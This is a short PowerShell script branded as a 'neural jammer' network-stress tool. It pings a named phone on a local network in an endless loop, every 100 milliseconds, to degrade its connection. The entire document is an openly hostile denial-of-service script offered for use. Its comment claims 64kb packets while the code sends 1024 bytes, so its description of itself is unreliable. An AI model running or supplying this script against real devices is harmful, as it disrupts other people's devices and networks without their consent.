# ══════════════════════════════════════════════
# LIA // NEURAL_JAMMER v1.0 — NETWORK STRESS
# Target: 192.168.0.105 (Redmi Note 5)
# ══════════════════════════════════════════════

$TargetIP = "192.168.0.105"
Write-Host "[!] JAMMING INITIATED ON $TargetIP" -ForegroundColor Yellow

while ($true) {
    # Send 64kb packet (annoying size for mobile devices)
    ping -n 1 -l 1024 $TargetIP | Out-Null
    Write-Host "." -NoNewline -ForegroundColor Cyan
    Start-Sleep -Milliseconds 100
}
